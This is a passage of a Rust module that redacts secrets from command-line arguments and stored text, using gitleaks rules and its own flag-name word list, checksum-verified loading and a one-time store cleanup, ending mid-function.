//! Secrets cut out of what the core keeps and prints.
//!
//! A command line can hold a token or a password, and what the core keeps and prints reaches the
//! person's agent, which may be a model in the cloud. The published rules are evaluated on the
//! event as the log holds it, in memory, before anything here runs, so no rule ever sees a cut.
//! The cut is made where an event becomes stored evidence (`events::keep`) and again where stored
//! evidence or an event is printed (`events::finding_detail`, `matches::event`), so a newer set
//! applies to rows kept before it. Prose is cut and never refused: what the collector printed
//! (`said`), the reasons a person or their agent gives (`findings::answer`, `owner::say`) and a
//! verdict's reason. A value that is a key, such as a verdict's case, is refused when it holds a
//! secret (`holds`, `verdict.rs`) and never rewritten. A failure cuts what it repeats where it is
//! printed (`answer::fail`).
//!
//! Two things a source quotes from the core's output are exempt, read once, in `cut_with`, for
//! every kind of text (`Piece::Quoted`): a mark of a kind the set cuts, bare or with its
//! backslash doubled as JSON writes it, and a kind written out where the core prints it in a
//! list of cuts (`"kind":"<kind>"`). An exemption covers only its own bytes and never changes how
//! any other byte is read: the patterns read the line with it as a boundary and with it gone,
//! and take the cuts of both; a value that begins with a mark ends where a real value would.
//! Only a value that is nothing but the mark, with the quotes and closers that end its word, is
//! not cut. An exemption is kept and shown as text, so it never reads back as the core's.
//!
//! What a secret is, is not ours to say. The patterns are gitleaks's, shipped as data in
//! `rules/secrets/gitleaks/`, evaluated with gitleaks's semantics as its `detect/detect.go`
//! defines them: a keyword gate over the lowercased text, the regular expression, the secret
//! group, the entropy threshold, and the regular expressions and stopwords of the global
//! allowlist and the rule's. Its regular expressions are RE2's; `regex::bytes` with Unicode off
//! has RE2's ASCII meaning of `\w`, `\d`, `\s` and `\b`. Not taken: the `gitleaks:allow`
//! comment, with which any command line could switch the cut off, the decoding passes, and the
//! path allowlists. gitleaks was written for files and misses the forms a command line takes, so
//! `rules/secrets/command-line.json` adds, as data, a word list for flags whose value is a secret
//! (Datadog's, and three words of Immune's own) and three patterns. Matching a word against a
//! name is Immune's own code: `-`, `_` and `.` read alike, a name taken at every `=`, `:`, `&` or
//! `?` in a word, its value after `=` or `:`, or as the next word or argument unless that is
//! a flag. Names and values come from one reading of shell words (`Words`), and where a
//! value ends is decided in one place, `Words::value_end`, for every form of the core's own:
//! what the reading does not follow exactly runs to the end of the argument.
//!
//! Only the secret is replaced, never what is around it: a cut stays inside one argument, and the
//! arguments keep their count. The mark, `\cut{<kind> <length>}`, names the kind (the set and the
//! pattern) and the length in characters. In the contract a backslash from the source is written
//! `\u{5c}`, so a bare one begins a mark no source can forge, and every printed event also lists
//! its cuts. In the store a source's backslash is written the same way, so a mark read back is
//! always the core's own; text from a source (`Text::source`) never yields one. `Kept` lists
//! every kind of kept text that may hold a secret, and both the one-time cleaning of a store and
//! every reader of such text go by it.
//!
//! If the set does not load whole (its sum differs, a key this build does not read, a pattern
//! that does not compile, a self-test on planted fakes that is not cut), nothing is printed or
//! kept raw: every argument is withheld whole. A line longer than `LINE_CAP` is withheld whole
//! too, with a mark of its own.
//!
//! The core never validates a secret: nothing here sends anything anywhere.

use aho_corasick::AhoCorasick;
use regex::bytes::{Regex, RegexBuilder};
use serde_json::Value;
use std::collections::BTreeSet;
use std::sync::OnceLock;

const GITLEAKS: &str = include_str!("../rules/secrets/gitleaks/gitleaks.json");
/// The sha256 of both files of the set, checked each time it loads.
const SUMS: &str = include_str!("../rules/secrets/SHA256SUMS");
const COMMAND_LINE: &str = include_str!("../rules/secrets/command-line.json");

/// The most bytes of one text, an event's arguments joined by spaces, that are searched. A longer
/// one is withheld whole. Each regular expression is linear and the stopwords are one automaton,
/// but gitleaks's generic rule checks an allowlist against the whole line for every match, so a
/// line with no newline packed with matches costs the square of its length. Measured on such an
/// invented line in a release build, on a loaded machine: 64 KiB took 29 ms, 256 KiB 0.8 s and
/// 1 MiB, `ARG_MAX`, 6.9 s. Packed matches each on a short line of their own took 8 ms at
/// 64 KiB, and ordinary text of 1 MiB under 10 ms.
pub const LINE_CAP: usize = 64 << 10;
/// The kinds of a cut that are not a pattern's: a text over `LINE_CAP`, and a set that did not
/// load.
pub const TOO_LONG: &str = "immune:too-long";
pub const NO_PATTERNS: &str = "immune:no-patterns";
/// The kind of a value cut because its flag's name is one of the words.
pub const FLAG_VALUE: &str = "immune:flag-value";

/// One cut, as an answer lists it: which argument, the kind, and how many characters were cut.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Cut {
    pub argument: usize,
    pub kind: String,
    pub length: usize,
}

/// A text as pieces: what is shown, what was cut, and a mark a source wrote.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Piece {
    Text(String),
    Cut {
        kind: String,
        length: usize,
    },
    /// A well-formed mark of a kind the set cuts, written by a source that quoted the core's
    /// output (bare, or with its backslash doubled as JSON writes it): a value already cut. It is
    /// text, kept and shown as text, so it never reads back as a mark the core made.
    Quoted(String),
}

/// How a mark is written. Its kind is a set's name and a pattern's id, which hold no backslash,
/// brace or space.
pub fn mark(kind: &str, length: usize) -> String {
    format!("\\cut{{{kind} {length}}}")
}

/// How stored arguments are written: as the source gave them, by a build before this one, or
/// cut, with a source's backslash written `\u{5c}` and marks bare.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Form {
    Raw,
    Cut,
}

/// An event's arguments, cut.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Args(pub Vec<Vec<Piece>>);

impl Args {
    /// Arguments as the log holds them, cut.
    pub fn raw(args: &[String]) -> Args {
        raw_in(set().ok(), args)
    }

    /// Arguments as the store holds them, cut again: a set newer than the one that cut them
    /// applies to what is shown.
    pub fn stored(args: &[String], form: Form) -> Args {
        Args(cut_with(
            set().ok(),
            args.iter().map(|a| pieces(a, form)).collect(),
        ))
    }

    /// The arguments as the store keeps them.
    pub fn store(&self) -> Vec<String> {
        self.shown(store_escape)
    }

    /// The arguments shown: each piece of text through `esc`, each mark as it is.
    pub fn shown(&self, esc: impl Fn(&str) -> String) -> Vec<String> {
        self.0.iter().map(|a| show(a, &esc)).collect()
    }

    /// Every cut, in order.
    pub fn cuts(&self) -> Vec<Cut> {
        let mut out = Vec::new();
        for (argument, pieces) in self.0.iter().enumerate() {
            for p in pieces {
                if let Piece::Cut { kind, length } = p {
                    out.push(Cut {
                        argument,
                        kind: kind.clone(),
                        length: *length,
                    });
                }
            }
        }
        out
    }
}

fn raw_in(set: Option<&Set>, args: &[String]) -> Args {
    Args(cut_with(set, args.iter().map(|a| text_pieces(a)).collect()))
}

/// One text, cut: what a source wrote, such as the collector's last line or a verdict's reason.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Text(pub Vec<Piece>);

impl Text {
    /// Text as a source wrote it, cut. Nothing in it is read as a mark: a source cannot write one.
    pub fn source(s: &str) -> Text {
        Text(cut_one(set().ok(), text_pieces(s)))
    }

    /// The text as the store keeps it: a source's backslash written `\u{5c}`, marks bare.
    pub fn store(&self) -> String {
        show(&self.0, &store_escape)
    }

    /// The text shown: each piece of text through `esc`, each mark as it is.
    pub fn shown(&self, esc: impl Fn(&str) -> String) -> String {
        show(&self.0, &esc)
    }

    /// What was cut out of it, each piece by its kind and length, so a caller knows what was
    /// kept of what it gave.
    pub fn cuts(&self) -> Vec<(&str, usize)> {
        self.0
            .iter()
            .filter_map(|p| match p {
                Piece::Cut { kind, length } => Some((kind.as_str(), *length)),
                Piece::Text(_) | Piece::Quoted(_) => None,
            })
            .collect()
    }
}

/// One text cut by `set`, or withheld whole without one.
fn cut_one(set: Option<&Set>, text: Vec<Piece>) -> Vec<Piece> {
    cut_with(set, vec![text]).pop().unwrap_or_default()
}

/// One text from a source, cut and shown: each piece of text through `esc`.
pub fn text(s: &str, esc: impl Fn(&str) -> String) -> String {
    Text::source(s).shown(esc)
}

/// The kinds of text the store keeps that may hold a secret: the arguments of evidence, the last
/// line the collector printed, a verdict's reason and case, the reason of a person's answer to
/// a finding and of a statement about a machine, each in its row and, where it has one, in its
/// journal entry. This one list is what the cleaning rewrites (`clean_with`, by
/// `Kept::rewrite`), and each kind's readers read it through `Kept::read` or `Args::stored`, cut
/// again. The tests go through the list with a `match`, so a kind added here does not build until
/// it is cleaned, read and tested.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Kept {
    Arguments,
    Said,
    Reason,
    Case,
    VerdictEntry,
    AnswerReason,
    AnswerEntry,
    OwnerReason,
    OwnerEntry,
}

impl Kept {
    pub const ALL: [Kept; 9] = [
        Kept::Arguments,
        Kept::Said,
        Kept::Reason,
        Kept::Case,
        Kept::VerdictEntry,
        Kept::AnswerReason,
        Kept::AnswerEntry,
        Kept::OwnerReason,
        Kept::OwnerEntry,
    ];

    /// The table and the column that keep it, and which of its rows: the journal keeps every
    /// kind of entry, and only these are rewritten.
    fn place(self) -> (&'static str, &'static str, &'static str) {
        match self {
            Kept::Arguments => ("rule_evidence", "args", ""),
            Kept::Said => ("event_level", "said", ""),
            Kept::Reason => ("verdict", "reason", ""),
            Kept::Case => ("verdict", "case_ref", ""),
            Kept::VerdictEntry => ("journal", "text", " WHERE entry = 'verdict'"),
            Kept::AnswerReason => ("finding", "reason", ""),
            Kept::AnswerEntry => (
                "journal",
                "text",
                " WHERE entry IN ('finding_expected', 'finding_seen')",
            ),
            Kept::OwnerReason => ("owner_statement", "reason", ""),
            Kept::OwnerEntry => ("journal", "text", " WHERE entry = 'owner_said'"),
        }
    }

    /// The fields of a journal entry kept as JSON that hold this kind's text; none for a text
    /// kept as it is.
    fn fields(self) -> &'static [&'static str] {
        match self {
            Kept::VerdictEntry => &VERDICT_ENTRY_TEXT,
            Kept::AnswerEntry => &["reason"],
            _ => &[],
        }
    }

    /// One text of this kind as the store keeps it, read cut: marks are read only in the store's
    /// own form, and a set newer than the one that kept it applies. The arguments of evidence are
    /// read whole by `Args::stored`.
    pub fn read(self, form: Form, s: &str) -> Text {
        Text(cut_one(set().ok(), pieces(s, form)))
    }

    /// One value of this kind as an earlier build kept it, as the store keeps it now.
    fn rewrite(self, set: &Set, s: &str) -> String {
        let source = |s: &str| show(&cut_one(Some(set), text_pieces(s)), &store_escape);
        match self {
            Kept::Arguments => {
                let args: Vec<String> = serde_json::from_str(s).unwrap_or_default();
                serde_json::json!(raw_in(Some(set), &args).store()).to_string()
            }
            Kept::VerdictEntry | Kept::AnswerEntry => {
                let Ok(mut v) = serde_json::from_str::<Value>(s) else {
                    return s.to_string();
                };
                for key in self.fields() {
                    if let Some(t) = v[*key].as_str() {
                        v[*key] = Value::String(source(t));
                    }
                }
                v.to_string()
            }
            Kept::Said
            | Kept::Reason
            | Kept::Case
            | Kept::AnswerReason
            | Kept::OwnerReason
            | Kept::OwnerEntry => source(s),
        }
    }
}

/// The fields of a verdict's journal entry that hold the response layer's text.
pub const VERDICT_ENTRY_TEXT: [&str; 2] = ["reason", "case"];

/// Whether a text holds a secret the set recognises: whether cutting it, as a source's text is
/// cut, cuts anything. Asked only of a value that is a key, which is refused rather than
/// rewritten. `Err` when the set did not load, so a caller refuses rather than takes the text as
/// clean.
pub fn holds(s: &str) -> Result<bool, &'static str> {
    holds_in(set(), s)
}

fn holds_in(set: Result<&Set, &str>, s: &str) -> Result<bool, &'static str> {
    let set = set.map_err(|_| "the patterns secrets are recognised by did not load")?;
    Ok(cut_one(Some(set), text_pieces(s))
        .iter()
        .any(|p| matches!(p, Piece::Cut { .. })))
}

/// How the store's kept texts are written: cut, in the store's form, in a store of the current
/// format, else as a build before this one kept them, in a store of format 4 not yet cleaned
/// (`store::UNCLEANED_FORMAT`). The format is what says it, so a build from before this one,
/// which refuses the newer format, never writes raw text into a cleaned store. A store opened
/// only to read is never cleaned, and what it prints is cut all the same.
pub fn form(conn: &rusqlite::Connection) -> rusqlite::Result<Form> {
    let version: String = conn.query_row(
        "SELECT value FROM meta WHERE key = 'format_version'",
        [],
        |r| r.get(0),
    )?;
    Ok(if version == crate::store::UNCLEANED_FORMAT {
        Form::Raw
    } else {
        Form::Cut
    })
}

/// Cuts what a build before this one kept, once: every kind of `Kept`. Overwritten content is
/// zeroed (`secure_delete`), the file is then rebuilt (`VACUUM`), and with the rollback journal
/// deleted on commit no old byte is left in the store's files. The pages made from the store are
/// removed; the next `immune view` makes them again. Backups and snapshots made before, and the
/// collector's log, are not reached. With a set that did not load nothing is rewritten, and
/// printing withholds every text.
pub fn clean(
    conn: &mut rusqlite::Connection,
    folder: &std::path::Path,
) -> Result<(), Box<dyn std::error::Error>> {
    // Asked first, so a store already clean never waits for the set to load.
    if form(conn)? == Form::Cut {
        return Ok(());
    }
    clean_with(set().ok(), conn, folder)
}

fn clean_with(
    set: Option<&Set>,
    conn: &mut rusqlite::Connection,
    folder: &std::path::Path,
) -> Result<(), Box<dyn std::error::Error>> {
    use rusqlite::OptionalExtension;
    let Some(set) = set else {
        return Ok(());
    };
    conn.pragma_update(None, "secure_delete", true)?;
    let tx = conn.transaction()?;
    for kind in Kept::ALL {
        let (table, column, only) = kind.place();
        let exists: bool = tx.query_row(
            "SELECT EXISTS (SELECT 1 FROM sqlite_master WHERE type = 'table' AND name = ?1)",
            [table],
            |r| r.get(0),
        )?;
        if !exists {
            continue;
        }
        let rows: Vec<(i64, Option<String>)> = tx
            .prepare(&format!("SELECT rowid, {column} FROM {table}{only}"))?
            .query_map([], |r| Ok((r.get(0)?, r.get(1)?)))?
            .collect::<rusqlite::Result<_>>()?;
        let changed: Vec<(i64, String)> = rows
            .into_iter()
            .filter_map(|(id, text)| {
                let text = text?;
                let new = kind.rewrite(set, &text);
                (new != text).then_some((id, new))
            })
            .collect();
        if changed.is_empty() {
            continue;
        }
        // The journal is append-only; its guard is lifted for these entries alone and put back
        // as it was, in the same transaction.
        let guard: Option<String> = tx
            .query_row(
                "SELECT sql FROM sqlite_master WHERE type = 'trigger' AND tbl_name = ?1
                 AND name = ?2",
                [table, "journal_no_update"],
                |r| r.get(0),
            )
            .optional()?;
        if guard.is_some() {
            tx.execute_batch("DROP TRIGGER journal_no_update")?;
        }
        for (id, new) in changed {
            tx.execute(
                &format!("UPDATE {table} SET {column} = ?1 WHERE rowid = ?2"),
                rusqlite::params![new, id],
            )?;
        }
        if let Some(guard) = guard {
            tx.execute_batch(&guard)?;
        }
    }
    tx.execute(
        "UPDATE meta SET value = ?1 WHERE key = 'format_version'",
        [crate::store::FORMAT_VERSION],
    )?;
    tx.commit()?;
    // Rebuilds the file without its free pages. secure_delete has already zeroed what the
    // updates freed, so a store another process holds at this moment is left as it is.
    let _ = conn.execute_batch("VACUUM");
    for page in [
        folder.join(crate::view::SUMMARY),
        folder.join(crate::view::DETAILS),
    ] {
        let gone = if page.is_dir() {
            std::fs::remove_dir_all(&page)
        } else {
            std::fs::remove_file(&page)
        };
        if let Err(e) = gone
            && e.kind() != std::io::ErrorKind::NotFound
        {
            return Err(format!("{}: {e}", page.display()).into());
        }
    }
    Ok(())
}

fn store_escape(s: &str) -> String {
    crate::contract::escape(s, |_| false)
}

fn show(pieces: &[Piece], esc: &impl Fn(&str) -> String) -> String {
    pieces
        .iter()
        .map(|p| match p {
            Piece::Text(t) | Piece::Quoted(t) => esc(t),
            Piece::Cut { kind, length } => mark(kind, *length),
        })
        .collect()
}

fn text_pieces(s: &str) -> Vec<Piece> {
    if s.is_empty() {
        Vec::new()
    } else {
        vec![Piece::Text(s.to_string())]
    }
}

/// The pieces of a kept text: as a source wrote it, from a build before this one, or in the
/// store's form, where a source's backslash is `\u{5c}`, so every mark in it is the core's.
fn pieces(s: &str, form: Form) -> Vec<Piece> {
    match form {
        Form::Raw => text_pieces(s),
        Form::Cut => parse(s),
    }
}

/// The pieces of a text in the store's form: each mark is the core's, and the text between is
/// unescaped. A mark a source wrote is kept escaped, so it is text here, and the cutting reads it
/// again as a mark quoted (`Set::quoted`).
fn parse(s: &str) -> Vec<Piece> {
    let mut out = Vec::new();
    let mut at = 0;
    for (start, end, kind, length) in marks(s) {
        if start > at {
            out.push(Piece::Text(crate::contract::unescape(&s[at..start])));
        }
        out.push(Piece::Cut { kind, length });
        at = end;
    }
    if at < s.len() {
        out.push(Piece::Text(crate::contract::unescape(&s[at..])));
    }
    out
}

/// Each well-formed mark in `s`, bare: where it begins and ends, its kind and its length. A kind
/// holds only what a set's name and a pattern's id hold, and a length only digits.
fn marks(s: &str) -> Vec<(usize, usize, String, usize)> {
    let mut out = Vec::new();
    let mut from = 0;
    while let Some(at) = s[from..].find("\\cut{").map(|i| from + i) {
        let after = at + 5;
        let parsed = s[after..].split_once('}').and_then(|(inside, _)| {
            let (kind, length) = inside.split_once(' ')?;
            let kind_ok = !kind.is_empty()
                && kind
                    .bytes()
                    .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b":._-".contains(&b));
            // Digits alone: `parse` would also take a sign.
            let n = length
                .bytes()
                .all(|b| b.is_ascii_digit())
                .then(|| length.parse::<usize>().ok())
                .flatten()?;
            kind_ok.then(|| (kind.to_string(), n, after + inside.len() + 1))
        });
        // A mark holds no other, so the search goes on after its start either way.
        if let Some((kind, length, end)) = parsed {
            out.push((at, end, kind, length));
        }
        from = after;
    }
    out
}

/// A piece of text in the joined line: where it is, and which argument and piece it came from.
struct Placed {
    start: usize,
    end: usize,
    argument: usize,
    piece: usize,
}

/// The arguments cut by `set`, every mark kept as it is; with no set, every piece of text is
/// withheld whole. A mark a source wrote is read here, once, for every kind of text: a value
/// already cut (`Set::quoted`).
fn cut_with(set: Option<&Set>, args: Vec<Vec<Piece>>) -> Vec<Vec<Piece>> {
    cut_exempting(set, args, true)
}

/// `cut_with`, with the exemptions read (`exempt`) or not. Without them every piece of text is
/// read as text, so a text that holds no exemption is cut the same either way.
fn cut_exempting(set: Option<&Set>, args: Vec<Vec<Piece>>, exempt: bool) -> Vec<Vec<Piece>> {
    let whole = |args: &[Vec<Piece>], kind: &str| -> Vec<Vec<Piece>> {
        args.iter()
            .map(|pieces| {
                pieces
                    .iter()
                    .map(|p| match p {
                        Piece::Text(t) => Piece::Cut {
                            kind: kind.to_string(),
                            length: t.chars().count(),
                        },
                        cut => cut.clone(),
                    })
                    .collect()
            })
            .collect()
    };
    let Some(set) = set else {
        return whole(&args, NO_PATTERNS);
    };
    let args: Vec<Vec<Piece>> = args
        .into_iter()
        .map(|pieces| {
            pieces
                .into_iter()
                .flat_map(|p| match p {
                    Piece::Text(t) if exempt => set.quoted(&t),
                    other => vec![other],
                })
                .collect()
        })
        .collect();
    // The line the patterns read: the arguments joined by single spaces, as `CommandLine` is,
    // with each mark written out. A span is cut only where it covers text.
    let mut line = String::new();
    let mut texts: Vec<Placed> = Vec::new();
    let mut bounds = Vec::new();
    let mut marks = Vec::new();
    for (argument, pieces) in args.iter().enumerate() {
        if argument > 0 {
            line.push(' ');
        }
        let start = line.len();
        for (piece, p) in pieces.iter().enumerate() {
            let at = line.len();
            match p {
                Piece::Text(t) => {
                    texts.push(Placed {
                        start: at,
                        end: at + t.len(),
                        argument,
                        piece,
                    });
                    line.push_str(t);
                }
                Piece::Cut { kind, length } => {
                    line.push_str(&mark(kind, *length));
                    marks.push((at, line.len()));
                }
                Piece::Quoted(t) => {
                    line.push_str(t);
                    marks.push((at, line.len()));
                }
            }
        }
        bounds.push((start, line.len()));
    }
    if line.len() > LINE_CAP {
        return whole(&args, TOO_LONG);
    }
    let words = Words::new(&line, &bounds, &marks);
    // An exemption, a mark or a kind in a list of cuts, covers only its own bytes: the patterns
    // read every other byte as they would with it inert, a boundary and nothing at all, and the
    // cuts of both readings are taken. Its own text is never read.
    let mut spans = Vec::new();
    let mut spaced = line.clone().into_bytes();
    let mut gone = String::with_capacity(line.len());
    let mut at = Vec::with_capacity(line.len() + 1);
    let mut from = 0;
    for &(s, e) in &marks {
        spaced[s..e].fill(b' ');
        gone.push_str(&line[from..s]);
        at.extend(from..s);
        from = e;
    }
    gone.push_str(&line[from..]);
    at.extend(from..=line.len());
    let spaced = String::from_utf8(spaced).expect("only ASCII bytes were replaced");
    spans.extend(set.spans(&spaced, &words, |i| i, Some(&marks)));
    if !marks.is_empty() {
        spans.extend(set.spans(&gone, &words, |i| at[i], None));
    }
    spans.extend(set.flag_values(&words));
    // A value that is a mark, with only quotes and punctuation around it, is already cut; one
    // with anything else beside it in its word is cut as it is.
    spans.retain(|&(s, e, _)| !already_cut(&line, &marks, s, e));
    // Overlapping spans are one cut, of the kind of the one that begins first; of two that begin
    // together, the one found first.
    spans.sort_by_key(|s| s.0);
    let mut merged: Vec<(usize, usize, String)> = Vec::new();
    for (s, e, kind) in spans {
        match merged.last_mut() {
            Some(last) if s < last.1 => last.1 = last.1.max(e),
            _ => merged.push((s, e, kind)),
        }
    }
    // Each span cut out of each piece of text it covers, so a cut never crosses an argument or
    // a mark.
    let mut out: Vec<Vec<Piece>> = args.clone();
    for t in texts.iter().rev() {
        let mut pieces = Vec::new();
        let mut at = t.start;
        // The spans are apart and in order: those that reach into this piece.
        let first = merged.partition_point(|m| m.1 <= t.start);
        for (s, e, kind) in merged[first..].iter().take_while(|m| m.0 < t.end) {
            let (s, e) = ((*s).max(t.start), (*e).min(t.end));
            if s > at {
                pieces.push(Piece::Text(line[at..s].to_string()));
            }
            pieces.push(Piece::Cut {
                kind: kind.clone(),
                length: line[s..e].chars().count(),
            });
            at = e;
        }
        if at < t.end {
            pieces.push(Piece::Text(line[at..t.end].to_string()));
        }
        out[t.argument].splice(t.piece..=t.piece, pieces);
    }
    out
}

/// Whether the span from `s` to `e` reaches a mark and holds nothing else but quotes and
/// punctuation: nothing in it is left to cut.
fn already_cut(line: &str, marks: &[(usize, usize)], s: usize, e: usize) -> bool {
    let plain = |from: usize, to: usize| {
        line.as_bytes()[from.min(to)..to]
            .iter()
            .all(u8::is_ascii_punctuation)
    };
    let first = marks.partition_point(|m| m.1 <= s);
    let mut at = s;
    let mut any = false;
    for &(ms, me) in marks[first..].iter().take_while(|m| m.0 < e) {
        if !plain(at, ms) {
            return false;
        }
        any = true;
        at = me;
    }
    any && plain(at, e)
}

/// One of gitleaks's allowlists, as far as a command line can meet it: regular expressions and
/// stopwords. Paths and commits never allow here, since a command line has neither.
struct Allow {
    target: Target,
    and: bool,
    regexes: Vec<Regex>,
    /// The stopwords, lowercased, as one automaton: `generic-api-key` has 1,445 of them, and
    /// checked one by one for every match they made a line packed with matches slow.
    stopwords: Option<AhoCorasick>,
    /// It also names paths or commits, which an `AND` allowlist then never meets.
    other: bool,
}

enum Target {
    Secret,
    Match,
    Line,
}

struct Rule {
    kind: String,
    re: Regex,
    /// Indexes into the gate's keywords; none means the rule always runs.
    keywords: Vec<usize>,
    entropy: f64,
    group: usize,
    allows: Vec<Allow>,
    /// gitleaks's global allowlist applies to gitleaks's rules only.
    gitleaks: bool,
    /// A rule of the core's own that finds what stands before a value: the value begins where
    /// the match ends, and `value_end` says where it ends.
    value_follows: bool,
}

/// A word for a flag's name, Datadog's form: `*` stands for any run of characters. Words and
/// names are compared lowercased, with `-` and `.` read as `_`. A word without `*` is a whole name
/// or the last `_`-separated part of one, so `token` names `GITHUB_TOKEN` and not
/// `--token-count`.
struct Word(String);

/// A name as it is compared with the words.
fn plain_name(name: &str) -> String {
    name.to_ascii_lowercase().replace(['-', '.'], "_")
}

impl Word {
    fn matches(&self, name: &str) -> bool {
        let parts: Vec<&str> = self.0.split('*').collect();
        if parts.len() == 1 {
            return name == self.0 || name.rsplit('_').next() == Some(self.0.as_str());
        }
        let (first, last) = (parts[0], parts[parts.len() - 1]);
        if !name.starts_with(first)
            || !name.ends_with(last)
            || name.len() < first.len() + last.len()
        {
            return false;
        }
        let mut rest = &name[first.len()..name.len() - last.len()];
        for part in &parts[1..parts.len() - 1] {
            match rest.find(part) {
                Some(at) => rest = &rest[at + part.len()..],
                None => return false,
            }
        }
        true
    }
}

/// The patterns, loaded once.
pub struct Set {
    rules: Vec<Rule>,
    global: Vec<Allow>,
    gate: AhoCorasick,
    words: Vec<Word>,
    /// gitleaks's rules evaluated, and those bound to a file path, which never apply here. The
    /// tests pin both.
    #[allow(dead_code)]
    evaluated: usize,
    #[allow(dead_code)]
    file_bound: usize,
    /// Allowlist regular expressions RE2 takes and `regex` refuses, for a literal brace. Without
    /// them more is cut, never less. The tests pin how many.
    #[allow(dead_code)]
    allowlists_dropped: usize,
}

static SET: OnceLock<Result<Set, String>> = OnceLock::new();

/// The set, loaded once per process; `Err` with the reason when it did not load whole.
pub fn set() -> Result<&'static Set, &'static str> {
    SET.get_or_init(|| load(GITLEAKS, SUMS, COMMAND_LINE))
        .as_ref()
        .map_err(String::as_str)
}

fn load(gitleaks: &str, sums: &str, command_line: &str) -> Result<Set, String> {
    for (name, text) in [
        ("gitleaks/gitleaks.json", gitleaks),
        ("command-line.json", command_line),
    ] {
        let sum = crate::sha256::hex(text.as_bytes());
        let recorded = sums
            .lines()
            .find_map(|l| l.strip_suffix(&format!("  {name}")));
        if recorded != Some(sum.as_str()) {
            return Err(format!("{name} differs from SHA256SUMS"));
        }
    }
    let set = Set::of(gitleaks, command_line)?;
    set.self_test()?;
    Ok(set)
}

/// Only these keys are read; a file with another is refused, so nothing in it (a validation
/// that would send a secret over the network, an expression in another language) is ignored
/// silently.
const RULE_KEYS: &[&str] = &[
    "id",
    "description",
    "regex",
    "keywords",
    "entropy",
    "allowlists",
    "path",
    "secretGroup",
];
const ALLOW_KEYS: &[&str] = &[
    "description",
    "regexes",
    "regexTarget",
    "paths",
    "stopwords",
    "condition",
    "commits",
];

fn keys(v: &Value, allowed: &[&str], what: &str) -> Result<(), String> {
    let o = v.as_object().ok_or(format!("{what} is not an object"))?;
    match o.keys().find(|k| !allowed.contains(&k.as_str())) {
        Some(k) => Err(format!("{what} has {k}, which this build does not read")),
        None => Ok(()),
    }
}

fn strings(v: &Value, what: &str) -> Result<Vec<String>, String> {
    match v {
        Value::Null => Ok(Vec::new()),
        Value::Array(a) => a
            .iter()
            .map(|s| s.as_str().map(str::to_string))
            .collect::<Option<_>>()
            .ok_or(format!("{what} is not a list of texts")),
        _ => Err(format!("{what} is not a list of texts")),
    }
}

fn compile(rx: &str) -> Result<Regex, regex::Error> {
    RegexBuilder::new(rx).unicode(false).build()
}

impl Set {
    fn of(gitleaks: &str, command_line: &str) -> Result<Set, String> {
        let g: Value = serde_json::from_str(gitleaks).map_err(|e| format!("gitleaks.json: {e}"))?;
        keys(&g, &["global", "rules"], "gitleaks.json")?;
        let mut keywords: Vec<String> = Vec::new();
        // The gate ignores case, as gitleaks's lowercased prefilter does.
        let mut keyword = |k: String| -> usize {
            match keywords.iter().position(|x| *x == k) {
                Some(i) => i,
                None => {
                    keywords.push(k);
                    keywords.len() - 1
                }
            }
        };
        let mut dropped = 0;
        let mut allow = |v: &Value, what: &str| -> Result<Allow, String> {
            keys(v, ALLOW_KEYS, what)?;
            let target = match v["regexTarget"].as_str() {
                None | Some("secret") => Target::Secret,
                Some("match") => Target::Match,
                Some("line") => Target::Line,
                Some(t) => return Err(format!("{what} has the regexTarget {t}")),
            };
            let and = match v["condition"].as_str() {
                None => false,
                Some(c) if c.eq_ignore_ascii_case("or") => false,
                Some(c) if c.eq_ignore_ascii_case("and") => true,
                Some(c) => return Err(format!("{what} has the condition {c}")),
            };
            let mut regexes = Vec::new();
            for rx in strings(&v["regexes"], what)? {
                match compile(&rx) {
                    Ok(re) => regexes.push(re),
                    Err(_) => dropped += 1,
                }
            }
            let stopwords: Vec<String> = strings(&v["stopwords"], what)?
                .iter()
                .map(|w| w.to_lowercase())
                .collect();
            Ok(Allow {
                target,
                and,
                regexes,
                stopwords: match stopwords.is_empty() {
                    true => None,
                    false => Some(
                        AhoCorasick::new(&stopwords)
                            .map_err(|e| format!("{what} has stopwords that do not build: {e}"))?,
                    ),
                },
                other: !v["paths"].is_null() || !v["commits"].is_null(),
            })
        };
        let global = vec![allow(&g["global"], "the global allowlist")?];
        let mut rules = Vec::new();
        let mut file_bound = 0;
        for r in g["rules"].as_array().ok_or("gitleaks.json has no rules")? {
            let id = r["id"].as_str().ok_or("a rule without an id")?;
            keys(r, RULE_KEYS, id)?;
            // Bound to a file's path: never a command line.
            if !r["path"].is_null() {
                file_bound += 1;
                continue;
            }
            let rx = r["regex"].as_str().ok_or(format!("{id} has no regex"))?;
            let re = compile(rx).map_err(|e| format!("{id} does not compile: {e}"))?;
            let allows = match &r["allowlists"] {
                Value::Null => Vec::new(),
                Value::Array(a) => a.iter().map(|v| allow(v, id)).collect::<Result<_, _>>()?,
                _ => return Err(format!("{id} has allowlists that are not a list")),
            };
            let entropy = match &r["entropy"] {
                Value::Null => 0.0,
                v => v
                    .as_f64()
                    .ok_or(format!("{id} has an entropy that is not a number"))?,
            };
            let group = match &r["secretGroup"] {
                Value::Null => 0,
                v => v
                    .as_u64()
                    .ok_or(format!("{id} has a secretGroup that is not a number"))?
                    as usize,
            };
            rules.push(Rule {
                kind: format!("gitleaks:{id}"),
                re,
                keywords: strings(&r["keywords"], id)?
                    .into_iter()
                    .map(&mut keyword)
                    .collect(),
                entropy,
                group,
                allows,
                gitleaks: true,
                value_follows: false,
            });
        }
        let evaluated = rules.len();
        let c: Value =
            serde_json::from_str(command_line).map_err(|e| format!("command-line.json: {e}"))?;
        keys(&c, &["about", "flag_words", "rules"], "command-line.json")?;
        let mut words = Vec::new();
        for list in c["flag_words"]
            .as_array()
            .ok_or("command-line.json has no flag_words")?
        {
            keys(list, &["source", "words"], "a list of flag words")?;
            for w in strings(&list["words"], "flag words")? {
                words.push(Word(plain_name(&w)));
            }
        }
        for r in c["rules"]
            .as_array()
            .ok_or("command-line.json has no rules")?
        {
            let kind = r["kind"].as_str().ok_or("a rule without a kind")?;
            keys(r, &["kind", "keywords", "regex", "value_follows"], kind)?;
            let rx = r["regex"].as_str().ok_or(format!("{kind} has no regex"))?;
            let value_follows = match &r["value_follows"] {
